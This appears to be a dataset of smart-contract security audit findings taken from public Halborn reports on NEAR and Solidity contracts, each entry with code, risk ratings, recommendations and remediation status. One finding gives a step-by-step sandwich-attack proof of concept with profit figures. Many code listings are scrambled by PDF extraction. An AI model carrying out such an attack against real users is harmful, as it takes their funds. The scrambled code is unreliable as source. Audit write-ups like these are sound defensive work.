protocol_settings . set (& protocol_settings ); 26 Listing 13: appchain-anchor/src/user_actions/settings_manager.rs 182 fn change_unlock_period_of_validator_deposit (& mut self , value : U64  ) { 183 184 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 185 186 assert! ( value .0 ! = protocol_settings .  unlock_period_of_validator_deposit .0 , 187 188 189 190 191 } \" The value is not changed . \" ); protocol_settings . unlock_period_of_validator_deposit = value ; self . protocol_settings . set (& protocol_settings ); Risk Level: Likelihood - 2 Impact - 4 Recommendation: Upper limits should be checked before setting the value. Remediation Plan: RISK ACCEPTED: The Octopus Network team accepted the risk of this finding. 27 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Medium"]}, {"title": "MINIMUM VALIDATOR COUNT CAN BE SET TO 0 OR 1", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "change_minimum_validator_count() \"appchain- The anchor/src/user_actions/settings_manager.rs\" guarantee that the minimum validator count set by the owner is not less than 0 or 1 validators at the same time, that directly impacts the security of the chain. A minimum validators constant should be set and checked in that function to make sure validator counts cannot go below that threshold. in not method does Code Location: Listing 14: appchain-anchor/src/user_actions/settings_manager.rs 149 fn change_minimum_validator_count (& mut self , value : U64 ) { 150 151 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 152 153 154 155 156 157 158 } assert! ( value .0 ! = protocol_settings . minimum_validator_count .0 , \" The value is not changed . \" ); protocol_settings . minimum_validator_count = value ; self . protocol_settings . set (& protocol_settings ); Risk Level: Likelihood - 2 Impact - 2 28 Recommendation: The minimum validator count must be compared to a fixed lower amount before being set. Remediation Plan: RISK ACCEPTED: The Octopus Network team accepted the risk stating \"The minimum validator count of the protocol settings will only affect the verification process in the go_booting function, it is just a reference value. Other than that, it does not affect any other functions in the contract or the actual actions/status of the application chain. In some special cases, we can set it to 0 or 1, to change the state of the contract for further operations.\" 29 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Low"]}, {"title": "LACK OF UPPER BOUND CHECKS ON DECIMALS LEADS TO PANICS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The get_market_value_of() function in \"appchain-anchor/src/assets/near_- fungible_tokens.rs\" and \"appchain-anchor/src/assets/wrapped_appchain_to- ken.rs\" uses the decimals value in the respective token as an exponent while raising a power and the value is then stored in a u128 variable. The issue here is that the decimals value is not validated before being used when the token is created, leading to the ability to pass any value in the range of 0-255, which allows the token creator to cause a panic case whenever the get_market_value_of() function is called since the pow() function call would yield a value well beyond the possible range of u128. Code Location: Listing 15: appchain-anchor/src/assets/near_fungible_tokens.rs if let Some ( near_fungible_token ) = self . tokens . get (& symbol ) { amount / u128 :: pow (10 , u32 :: from ( near_fungible_token . 83 pub fn get_market_value_of (& self , symbol : & String , amount : u128 )  -> Balance { 84 85  metadata . decimals )) 86 87 88 89 90 } * near_fungible_token . price_in_usd .0 } else { 0 } Listing 16: appchain-anchor/src/assets/wrapped_appchain_token.rs amount / u128 :: pow (10 , u32 :: from ( self . metadata . decimals )) * 58 pub fn get_market_value_of (& self , amount : u128 ) -> Balance { 59  self . price_in_usd .0 60 } 30 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Upper bounds should be checked before setting the value. Remediation Plan: RISK ACCEPTED: The Octopus Network team accepted the risk of this finding. 31 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Low"]}, {"title": "DEFAULT BRIDGING STATE FOR NEW NEAR FUNGIBLE TOKENS IS ACTIVE WHILE IT SHOULD BE CLOSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The implementation detail document states that newly registered NEAR fungible tokens should have their bridging state set to Closed. \"appchain- However, anchor/src/assets/near_fungible_tokens.rs\" registers the token with the bridging state of Active. the register_near_fungible_token() function in Code Location: Listing 17: appchain-anchor/src/assets/near_fungible_tokens.rs & mut self , symbol : String , name : String , decimals : u8 , contract_account : AccountId , price : U128 , 96 fn register_near_fungible_token ( 97 98 99 100 101 102 103 ) { 104 105 self . assert_owner () ; let mut near_fungible_tokens = self . near_fungible_tokens . get ()  . unwrap () ; 106 107 108 109 110 111 112 113 114 115 assert! ( !near_fungible_tokens . contains (& symbol ) , \" Token '{} ' is already registered . \" , & symbol ); near_fungible_tokens . insert (& NearFungibleToken { metadata : FungibleTokenMetadata { spec : \"ft -1.0.0 \" . to_string () , symbol , name , 32 116 117 118 119 120 121 122 123 124 125 126 127 } decimals , icon : None , reference : None , reference_hash : None , }, contract_account , price_in_usd : price , locked_balance : U128 :: from (0) , bridging_state : BridgingState :: Active , }) ; self . near_fungible_tokens . set (& near_fungible_tokens ); Risk Level: Likelihood - 2 Impact - 2 Recommendation: The function should set the bridging_state value to BridgingState::Closed instead of BridgingState::Active while creating the token. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 33 3.10 (HAL-10) LACK OF VALIDATOR ACCOUNTID VALIDATION ALLOWS USING INVALID ACCOUNTID - LOW ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Low"]}, {"title": "PRODUCTTOKENHIGHBASE CONTRACT IS VULNERABLE TO SANDWICH ATTACKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract ProductTokenHighBase is an ERC20 contract that allows users to buy and sell a product token. The buying and selling price of the token is based on a pricing algorithm called Bonding Curve. This algorithm causes the price of the token to increase with every purchase, meaning that early buyers are rewarded as they can, then, sell the tokens back for a profit. The function buy(uint256 maxPrice_) allows users to buy a product token with a maximum acceptable price. It only allows buying 1 token per call: Listing 1: ProductTokenHighBase.sol 78 function buy ( uint256 maxPrice_ ) external virtual whenNotPaused nonReentrant { if ( endTime [ FEATURE_ENDTIME_BUY ] != 0) { require ( now256 () < endTime [ FEATURE_ENDTIME_BUY ], \" sale is expire \"); } require ( maxPrice_ > 0, \" invalid max price \"); transferFromHighToken ( _msgSender () , address ( this ) , maxPrice_ ); ( uint256 change ) if ( change > 0) { = _buy ( maxPrice_ ); transferHighToken ( _msgSender () , change ); } 79 80 81 82 83 84 85 86 87 88 89 90 } The function sell(uint32 amount_) allows users to sell a product token, returning the equivalent HIGH tokens: 12 Listing 2: ProductTokenHighBase.sol 100 function sell ( uint32 amount_ ) external virtual whenNotPaused nonReentrant { if ( endTime [ FEATURE_ENDTIME_SELL ] != 0) { require ( now256 () < endTime [ FEATURE_ENDTIME_SELL ], \" sale is expire \"); } require ( amount_ > 0, \" Amount must be non - zero . \" ); require ( balanceOf ( _msgSender () ) >= amount_ , \" Insufficient tokens .\" ); uint256 price = _sell ( amount_ ); transferHighToken ( _msgSender () , price ); 101 102 103 104 105 106 107 108 109 } The growth of the price with each purchase is determined by the different bonding curve parameters, which are set in the initialize() function of the ProductTokenHighBase contract: Listing 3: ProductTokenHighBase.sol (Lines 47-50) 27 /* * 28 29 30 31 32 33 34 * @dev initializer function . * * @param _name the name of this token * @param _symbol the symbol of this token * @param _bondingCurve bonding curve instance address * @param _productNft product nft instance address * @param _reserveRatio the reserve ratio in the curve function . Number in parts per million 35 * @param _maxTokenCount the amount of token that will exist for this type . 36 * @param _supplyOffset this amount is used to determine initial price . 37 * @param _baseReserve the base amount of reserve tokens , in accordance to _supplyOffset . 38 * @param _endTime end time is the last time when user can buy and sell ; 39 * 40 */ 41 function initialize ( 42 string memory _name , 13 HIGH = _high ; ProductTokenCore . initialize ( string memory _symbol , address _high , address _bondingCurve , address _productNft , uint32 _reserveRatio , uint32 _maxTokenCount , uint32 _supplyOffset , uint256 _baseReserve , uint256 _endTime 43 44 45 46 47 48 49 50 51 52 ) public virtual initializer { 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 } _name , _symbol , _bondingCurve , _productNft , _reserveRatio , _maxTokenCount , _supplyOffset , _baseReserve ); if ( _endTime > 0) { } updateEndTime ( FEATURE_ENDTIME_MAX , _endTime ); As there are no restriction or cooldown period to sell the product token after its purchase, the buy() function calls are vulnerable to a sandwich attack. Proof of Concept: Based in the parameters found in the 2_deploy_contract.js file: - _reserveRatio the reserve ratio in the curve function. Number in parts per million -> 30000 - _maxTokenCount the amount of token that will exist for this type. -> 250 - _supplyOffset this amount is used to determine initial price. -> 700 - _baseReserve the base amount of reserve tokens. -> 800 14 1. Attacker scans the mempool for 2 ProductTokenHighBase.buy() transactions. 2. Attacker detects 2 ProductTokenHighBase.buy() txs in the mempool coming from user1 and user2. 3. Attacker frontruns both txs and calls himself ProductTokenHighBase .buy(). the exact price 4. If both users had set the maxPrice_ in ProductTokenHighBase.buy() to (ProductTokenHighBase.getCurrentPrice()), their txs would revert. If that was the case, it makes sense to think that they would resubmit their transactions with a higher maxPrice_. On the other hand, if both users had set the maxPrice_ in ProductTokenHighBase.buy() with some margin, their txs would be completed but they would be paying a higher price for the ProductTokenHighBase product token. 5. Attacker backruns both txs (user1 and user2 txs) and sells the product token bought initially, getting a 3.33% profit: Tokens paid initially by the attacker (during the frontrun): 40_547860657636861605 Tokens paid by user1: 42_461906982198102077 Tokens paid by user2: 44_463383637847924478 Total tokens received by the attacker after the sale of the product token (during the backrun): 41_898188427972082682 Profitted tokens after sandwiching 2 users = 1_350327770335221077 % of 3.33% (1_350327770335221077 / 40_547860657636861605)x 100 = profit: With these bonding curve parameters, two additional purchases are needed before selling to make profit. With different bonding curve parameters, it would be possible to profit by just sandwiching one transaction instead of two, increasing this attack likelihood. Risk Level: Likelihood - 3 15 Impact - 5 Recommendation: to is set recommended It the ProductTokenHighBase contract in order that, before a user can profit by selling the product token, a number high enough of buy orders are needed. parameters bonding curve the of On the other hand, perhaps a simpler approach, another possible solution would be to add a cooldown on the sell() function, not allowing users to sell right away after a buy() call. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the following commit IDs: - 3d83211d1720c6cd1ae1cd21631a400c4932bad7 - 27d266184835bdf54aa3c8135a7d2a2a89fc7b37 A cooldown has been added that restricts users from calling sell(), transferFrom() and transfer() functions for a fixed period of time. 16 ", "labels": ["Halborn", "HighStreetMarket_ProductToken", "Severity: High"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract ProductTokenHighBase is missing zero address checks in its initializate() function. Every address should be validated and checked that is different from zero. Code location: Listing 4: ProductTokenHighBase.sol HIGH = _high ; ProductTokenCore . initialize ( string memory _name , string memory _symbol , address _high , address _bondingCurve , address _productNft , uint32 _reserveRatio , uint32 _maxTokenCount , uint32 _supplyOffset , uint256 _baseReserve , uint256 _endTime 41 function initialize ( 42 43 44 45 46 47 48 49 50 51 52 ) public virtual initializer { 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 } _name , _symbol , _bondingCurve , _productNft , _reserveRatio , _maxTokenCount , _supplyOffset , _baseReserve ); if ( _endTime > 0) { } updateEndTime ( FEATURE_ENDTIME_MAX , _endTime ); 17 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 84746701f0463a77d75c0ec8d7444784e594e42d 18 ", "labels": ["Halborn", "HighStreetMarket_ProductToken", "Severity: Low"]}, {"title": "EXTERNAL CALLS WITHIN A LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract ProductTokenHighBase the function tradein() allows users to trade in their Product token for a NFT. Listing 5: ProductTokenHighBase.sol (Lines 122) 116 function tradein ( uint32 amount_ ) external virtual whenNotPaused nonReentrant { if ( endTime [ FEATURE_ENDTIME_TRADEIN ] != 0) { require ( now256 () < endTime [ FEATURE_ENDTIME_TRADEIN ], \" sale is expire \"); } require ( amount_ > 0, \" Amount must be non - zero . \" ); require ( balanceOf ( _msgSender () ) >= amount_ , \" Insufficient tokens .\" ); _tradein ( amount_ ); 117 118 119 120 121 122 123 } Listing 6: ProductTokenCore.sol (Lines 466) (, uint256 fee ) = _sellReturn ( amount_ ); 453 function _tradein ( uint32 amount_ ) internal virtual { 454 455 456 457 458 459 460 461 462 _burn ( _msgSender () , amount_ ); // redeem value should give to supplier uint256 tradinReturn = _tradinReturn ( amount_ ); // 50% of fee and redeem price are for supplier _updateSupplierFee ( fee * FEE_MULTIPLIER / FEE_RATE_IN_SELL + tradinReturn ); // 50% of fee , is for plateform _updatePlateformFee ( fee * ( FEE_RATE_IN_SELL - FEE_MULTIPLIER ) / FEE_RATE_IN_SELL ); nft . mintBatch ( _msgSender () , tradeinCount , amount_ ); 463 464 465 466 467 19 tradeinCount = tradeinCount + amount_ ; tradeinReserveBalance = tradeinReserveBalance + tradinReturn ; emit Tradein ( _msgSender () , amount_ , tradinReturn , fee ); 468 469 470 471 472 } If a user trades in 10 Product tokens, 10 NFTs will be minted through the function ProductNft.mintBatch(): Listing 7: ProductNft.sol (Lines 145) 140 function mintBatch ( address to_ , uint256 start_ , uint256 count_ ) external { require ( minters [ _msgSender () ] == true , ' permission denied '); require ( to_ != address (0) , ' invalid receiver '); require ( start_ + count_ < maxCount , \" cap exceeded \" ); for ( uint256 index = start_ ; index < start_ + count_ ; index ++) { _safeMint ( to_ , index ); } emit MintBatch ( to_ , start_ , count_ ); 141 142 143 144 145 146 147 148 149 } The gas cost of minting 10 NFTs is 1.258.049. This would already exceed, for example, Metamask default gas limit of 1,200,000 GWEI. Users not aware of this may submit the transaction to then find out that the transaction have failed with an Out of gas message. A transaction of 1,200,000 GWEI in gas is worth $451.95 (date: 01/01/2022). This is the potential loss that can happen to a user not aware of this. For that reason, it is recommended to limit the amount_ parameter of the tradein() function. 20 Proof of Concept: Risk Level: Likelihood - 2 Impact - 2 21 Recommendation: It is recommended to limit the amount_ parameter of the tradein() function, making sure that is, for example, lower than 10. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 56f794ef686c2840afd35f7255ce8cb23bba8127 22 ", "labels": ["Halborn", "HighStreetMarket_ProductToken", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: BancorBondingCurve.sol - calculatePriceForNTokens() (BancorBondingCurve.sol#38-64) - calculatePurchaseReturn() (BancorBondingCurve.sol#81-109) - calculateSaleReturn() (BancorBondingCurve.sol#125-159) ProductTokenCore.sol - getCurrentPrice() (ProductTokenCore.sol#260-263) - calculateBuyReturn() (ProductTokenCore.sol#329-334) - calculateSellReturn() (ProductTokenCore.sol#363-367) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 674c5f7a814acf33bafaedd43c94df0731e69c73 23 ", "labels": ["Halborn", "HighStreetMarket_ProductToken", "Severity: Informational"]}, {"title": "TYPO IN FUNCTION NAMES AND EVENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following functions, variables, and events in the ProductTokenCore contract have a typo: Plateform instead of Platform.  Line 64: uint256 private plateformFee;  Line 150: event ClaimPlateformFee(address indexed sender, uint256 amount);  Line 411: _updatePlateformFee(fee * (FEE_RATE_IN_BUY - FEE_MULTIPLIER)/ FEE_RATE_IN_BUY);  Line 440: _updatePlateformFee(fee * (FEE_RATE_IN_SELL - FEE_MULTIPLIER)/ FEE_RATE_IN_SELL);  Line 464: _updatePlateformFee(fee * (FEE_RATE_IN_SELL - FEE_MULTIPLIER)/ FEE_RATE_IN_SELL);  Line 488: function _updatePlateformFee(uint256 fee_)internal virtual {  Line 489: plateformFee = plateformFee + fee_;  Line 551: function getPlateformFee()external view virtual returns( uint256 amount){  Line 553: return plateformFee;  Line 562: function claimPlateformFee(uint256 amount_)external virtual {  Line 564: require(amount_ <= plateformFee, \"amount is exceed\");  Line 567: plateformFee = plateformFee - amount_;  Line 569: emit ClaimPlateformFee(_msgSender(), amount_); Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: It is recommended to correct the typo in all the functions, variables, and events mentioned. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 97746779dd28d751e1d1ce87b2c123300928704c 25 ", "labels": ["Halborn", "HighStreetMarket_ProductToken", "Severity: Informational"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum re-presentable value. Code Location: WolfyStreetBetsV1.sol - Line #670-671 Listing 1: WolfyStreetBetsV1.sol 1 function startPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) public onlyOwner { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 require (! poolStarted , \" Previous pool not finalized yet \" ); require ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk > 0 ,\" Low Risk Pool : Please add liquidity \" ); require ( totalLiquidityHighRisk + liquidityDetailsOwner . _highRisk > 0 ,\" High Risk Pool : Please add liquidity \") ; // 30 minutes for testing ONLY require ( block . timestamp > liquidityCycleStartTime . add (30 minutes ) , \" Cannot start pool during liquidity cycle \" ); // PLEASE UNCOMMENT ME FOR MAINNET // require ( block . timestamp > liquidityCycleStartTime . add (12 hours ) , \" Cannot start pool during liquidity cycle \") ; predictionAsset1 = _predictionAsset1 ; predictionAsset2 = _predictionAsset2 ; poolStartTime = block . timestamp ; poolStarted = true ; liquidityCycle = false ; 14 17 } WolfyStreetBetsV1.sol - Line #728-729-730-733-734-735-736-739 Listing 2: WolfyStreetBetsV1.sol 1 function stake ( uint256 _amount , bool _isLowRisk ) public { 2 require ( _amount > 0 , \" You can 't stake with 0. Choose an 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 amount ! \" ); require ( poolStarted , \" Cannot stake until pool has been started ! \"); // FOR MAINNET PLEASE UNCOMMENT ME // require ( block . timestamp <= poolStartTime . add (12 hours ) ,\"12 hour staking window has now passed !\" ) ; // Can stake upto 12 hours from start pool . uint256 stakeAmount ; if ( liquidityReward >= 1) { stakeAmount = _amount . sub ((( _amount . mul ( liquidityReward ) ). div (100) ) . div (10) ) ; } else { stakeAmount = _amount ; } if ( _isLowRisk ) { require ( ledgerL . add ( stakeAmount ) <= ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk ). mul (6) , \" Low risk pool : Staking limit reached ! \" ); require ( _poolBalances [ _msgSender () ][ _isLowRisk ]. add ( stakeAmount ) <= ( totalLiquidityLowRisk + liquidityDetailsOwner . _lowRisk ). mul (6) , \" Low risk pool : Staking limit reached ! \" ); liquidityRewardCollectedLowRisk += (( _amount . mul ( liquidityReward )) . div (100) ). div (10) ; ledgerL += stakeAmount ; } else { require ( ledgerH . add ( stakeAmount ) <= ( totalLiquidityHighRisk + liquidityDetailsOwner . 15 _highRisk ). mul (3) , \" High risk pool : Staking limit reached ! \" ); require ( _poolBalances [ _msgSender () ][ _isLowRisk ]. add ( stakeAmount ) <= ( totalLiquidityHighRisk + liquidityDetailsOwner . _highRisk ). mul (3) , \" High risk pool : Staking limit reached ! \"); liquidityRewardCollectedHighRisk += (( _amount . mul ( liquidityReward )) . div (100) ). div (10) ; ledgerH += stakeAmount ; } _isLowRisk == true ? storeUsers ( _msgSender () , _lowRiskUsers ): storeUsers ( _msgSender () , _highRiskUsers ); _poolBalances [ _msgSender () ][ _isLowRisk ] += stakeAmount ; TOKEN . safeTransferFrom ( _msgSender () , address ( this ) , _amount ); distributeLiquidityRewards ( true ); distributeLiquidityRewards ( false ); } 23 24 25 26 27 28 29 30 31 32 33 34 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider to replace all + - * / mathematical operations via Safe Math li- brary implementations. (add-sub-mul-div) It is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system or use pragma version bigger than 0.8.0 that adds arithmetic checks automatically. Remediation Plan: SOLVED: WOLFY Team rightly implemented mathematical operations. All math- ematical operations are completed through SafeMath. 16 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Medium"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in the WolfyStreetBetsV1.sol. Code Location: WolfyStreetBetsV1.sol Line #1019-1025 Listing 3: EglContract.sol (Lines ) 1016 function 1017 1018 distributeLiquidityRewards ( bool _isLowRisk ) internal { for ( uint i =0; i < LiquidityDetailsRecord . length ; i ++) { if ( _isLowRisk && LiquidityDetailsRecord [ i ]. isLowRisk 1019 1020 1021 1022 1023 1024 1025 == true ) { uint256 rewardPerc = (( LiquidityDetailsRecord [ i ]. _lowRisk . mul (10** decimals () )) . mul (100*10** decimals () )) . div ( totalLiquidityLowRisk . mul (10** decimals () )) ; uint256 rewardAmount = (( liquidityRewardCollectedLowRisk . mul (10** decimals () ) ). mul ( rewardPerc ) ) /(100 * 10** decimals () ); rewardPaidRecord [ LiquidityDetailsRecord [ i ]. _address ]. push ( RewardPaid ( rewardAmount . div (10** decimals () ) , block . timestamp , false )) ; userLPReward [ LiquidityDetailsRecord [i ]. _address ] += rewardAmount ; } else if ( _isLowRisk == false && LiquidityDetailsRecord [ i ]. isLowRisk == false ) { uint256 rewardPerc = (( LiquidityDetailsRecord [ i ]. _highRisk . mul (10** decimals () )) . mul (100*10** decimals () )) . div ( totalLiquidityHighRisk . mul (10** decimals () )) ; 17 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 uint256 rewardAmount = (( liquidityRewardCollectedHighRisk . mul (10** decimals () ) ). mul ( rewardPerc ) ) /(100 * 10** decimals () ); rewardPaidRecord [ LiquidityDetailsRecord [ i ]. _address ]. push ( RewardPaid ( rewardAmount . div (10** decimals () ) , block . timestamp , false )) ; userLPReward [ LiquidityDetailsRecord [i ]. _address ] += rewardAmount ; } } if ( _isLowRisk ) { liquidityRewardCollectedLowRisk = 0; } else { liquidityRewardCollectedHighRisk = 0; } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non floating data type. Remediation Plan: SOLVED: WOLFY Team rightly implemented mathematical operations. The cal- culation is adjusted according to suggestion. 18 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Low"]}, {"title": "LACK OF FUNCTIONALITY ON THE TRUSTED FORWARDER FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the WolfyStreetBetsV1.sol contract, trusted forwarder has been used for biconomy upgrades. However, the function didnt set trusted forwarder there that is uncomplete. Code Location: Listing 4: WolfyStreetBetsV1.sol (Lines ) 609 610 611 612 613 614 615 /* * * @dev Updates trusted forwarder should biconomy upgrades occur . */ function setTrustedForwarder ( address _trustedForwarder ) public view onlyOwner { require ( _trustedForwarder != address (0) , \" Address cannot be 0 x0 \" ); require ( _trustedForwarder != address ( this ) , \" Address cannot be contract address \" ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to set trusted forwarder on the related function. If that functionality will not use, for gas improvement the function should be deleted from the code base. 19 Listing 5: WolfyStreetBetsV1.sol (Lines ) 609 610 611 612 613 614 615 616 617 618 /* * * @dev Updates trusted forwarder should biconomy upgrades occur . */ function setTrustedForwarder ( address _trustedForwarder ) public view onlyOwner { require ( _trustedForwarder != address (0) , \" Address cannot be 0 x0 \" ); require ( _trustedForwarder != address ( this ) , \" Address cannot be contract address \" ); trustedForwarder = _trustedForwarder ; emit TrustedForwarderSet ( trustedForwarder ); } Remediation Plan: SOLVED: WOLFY Team modified the code to set trusted forwarder on the related function. 20 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Low"]}, {"title": "GAS IMPROVEMENT ON THE WITHDRAW LIQUIDITY FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the WolfyStreetBetsV1.sol contract, _isLowRisk variable is used for checking multiple conditions on the provideLiquidity function. However, This that function redundantly checked multiple if/else statements. implementation will spend more gas with multiple inner statemements. Code Location: WolfyStreetBetsV1.sol Listing 6: WolfyStreetBetsV1.sol 952 function provideLiquidity ( uint256 amount , bool _isLowRisk ) 953 954 955 956 957 958 959 960 961 962 963 964 965 966 967 968 969 970 public { if ( _msgSender () != owner () ) { if ( _isLowRisk ) { LiquidityDetailsRecord . push ( LiquidityDetails ( amount ,0 , _msgSender () , block . timestamp , true , false , false )) ; } else { LiquidityDetailsRecord . push ( LiquidityDetails (0 , amount , _msgSender () , block . timestamp , false , false , false )) ; } if ( _isLowRisk == true ) { totalLiquidityLowRisk += amount ; currentLowLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityLRUsers ); } else { totalLiquidityHighRisk += amount ; currentHighLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityHRUsers ); } 21 971 972 } Recommendation: Consider to eliminate multiple condition check which proposes same inner statements. Listing 7: WolfyStreetBetsV1.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function provideLiquidity ( uint256 amount , bool _isLowRisk ) public { if ( _msgSender () != owner () ) { if ( _isLowRisk ) { LiquidityDetailsRecord . push ( LiquidityDetails ( amount ,0 , _msgSender () , block . timestamp , true , false , false )) ; totalLiquidityLowRisk += amount ; currentLowLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityLRUsers ); } else { LiquidityDetailsRecord . push ( LiquidityDetails (0 , amount , _msgSender () , block . timestamp , false , false , false )) ; totalLiquidityHighRisk += amount ; currentHighLiquidity [ _msgSender () ] += amount ; storeUsers ( _msgSender () , LiquidityHRUsers ); } .... } Remediation Plan: SOLVED: WOLFY Team removed the excess of if/else statements. 22 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Low"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "It has been observed that critical functionality is missing emitting event for some functions on the WolfyStreetBetsV1.sol contract. These functions should emit events after completing the transactions. Code Location: Listing 8: Missing Events 1 function setTrustedForwarder ( address _trustedForwarder ) 2 function setWinFactorL ( uint256 _winFactorL ) 3 function setWinFactorH ( uint256 _winFactorH ) 4 function storeUsers ( address receiver , address [] storage arrayData ) 5 function startPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) 6 function stopPool ( uint256 _predictionAsset1 , uint256 _predictionAsset2 ) 7 function stake ( uint256 _amount , bool _isLowRisk ) 8 function rewardManager ( uint256 _factor , bool _res ) 9 function withdrawPredictionStake ( uint256 _amount , bool _isLowRisk ) 10 function provideLiquidity ( uint256 amount , bool _isLowRisk ) 11 function withdrawLiquidityRewards ( uint256 amount ) Risk Level: Likelihood - 1 Impact - 2 Recommendations: Consider emitting an event when calling related functions on the list above. 23 Remediation Plan: SOLVED: WOLFY Team added events on the functions. 24 ", "labels": ["Halborn", "WolfyStreetBets", "Severity: Informational"]}, {"title": "IMPROPER CHECK EFFECT INTERACTION PATTERN USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/WolfyStreetBets_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In the Smart Contracts, The check effect interaction pattern is used to reduce the attack surface for malicious contracts trying to hijack control flow after an external call. In the WolfyStreetBetsV1.sol, ledgerL and ledgerH is updated after an external call. Code Location: Listing 9: WolfyStreetBetsV1.sol (Lines 118,119) 101 102 103 104 105 106 107 108 109 110 111 112 113 114 function withdrawPredictionStake ( uint256 _amount , bool _isLowRisk ) public nonReentrant { require (! poolStarted , \" Cannot withdraw Asset while pool is running \"); require ( _msgSender () != owner () ); require ( _amount <= _poolBalances [ _msgSender () ][ _isLowRisk ], \" Insufficient Balance \"); _poolBalances [ _msgSender () ][ _isLowRisk ] -= _amount ; TOKEN . safeTransfer ( _msgSender () , _amount ); if ( _isLowRisk ) { ledgerL -= _amount ; } else { ledgerH -= _amount ; } } Risk Level: Likelihood - 1 